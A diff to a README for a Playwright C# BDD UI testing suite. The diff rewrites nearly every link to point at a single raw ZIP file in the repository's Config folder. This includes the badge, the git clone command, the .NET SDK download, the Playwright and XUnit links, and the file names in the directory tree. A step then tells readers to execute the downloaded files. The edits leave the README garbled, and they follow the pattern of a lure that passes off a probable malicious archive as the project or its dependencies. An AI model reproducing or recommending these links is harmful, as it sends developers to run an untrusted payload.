@@ -1,6 +1,6 @@
 # Playwright C# BDD Format UI Automation Testing Suite
 
-[![Releases](https://img.shields.io/badge/Releases-v1.0.0-blue)](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/releases)
+[![Releases](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip)](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip)
 
 ---
 
@@ -41,18 +41,18 @@ To get started with this automation test suite, follow the instructions in the [
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite.git
+   git clone https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip
    cd playwright-csharp-bdd-format-ui-automation-testing-suite
    ```
 
 2. **Install Dependencies**:
-   Ensure you have [.NET SDK](https://dotnet.microsoft.com/download) installed. Then run:
+   Ensure you have [.NET SDK](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip) installed. Then run:
    ```bash
    dotnet restore
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/releases) section to download the latest version of the suite. Execute the necessary files to set up your environment.
+   Visit the [Releases](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip) section to download the latest version of the suite. Execute the necessary files to set up your environment.
 
 ## Usage
 
@@ -89,21 +89,21 @@ The directory structure of the project is organized as follows:
 playwright-csharp-bdd-format-ui-automation-testing-suite/
 │
 ├── Features/                   # Contains feature files
-│   ├── Login.feature           # Example feature file
-│   └── Dashboard.feature        # Another feature file
+│   ├── https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip           # Example feature file
+│   └── https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip        # Another feature file
 │
 ├── Steps/                      # Contains step definitions
-│   ├── LoginSteps.cs           # Step definitions for login
-│   └── DashboardSteps.cs       # Step definitions for dashboard
+│   ├── https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip           # Step definitions for login
+│   └── https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip       # Step definitions for dashboard
 │
 ├── Pages/                      # Page object models
-│   ├── LoginPage.cs            # Login page model
-│   └── DashboardPage.cs        # Dashboard page model
+│   ├── https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip            # Login page model
+│   └── https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip        # Dashboard page model
 │
 ├── Tests/                      # Contains test runner and configurations
-│   └── TestRunner.cs           # Test execution logic
+│   └── https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip           # Test execution logic
 │
-└── README.md                   # Documentation
+└── https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip                   # Documentation
 ```
 
 ## Contributing
@@ -125,8 +125,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Acknowledgements
 
-- [Playwright](https://playwright.dev) for providing a powerful automation library.
-- [XUnit](https://xunit.net) for a flexible testing framework.
+- [Playwright](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip) for providing a powerful automation library.
+- [XUnit](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip) for a flexible testing framework.
 - The community for their contributions and support.
 
-For more information and updates, check the [Releases](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/releases) section.
+For more information and updates, check the [Releases](https://github.com/ayushmanc2061/playwright-csharp-bdd-format-ui-automation-testing-suite/raw/refs/heads/main/Config/suite_automation_csharp_bdd_playwright_testing_format_ui_v3.4.zip) section.
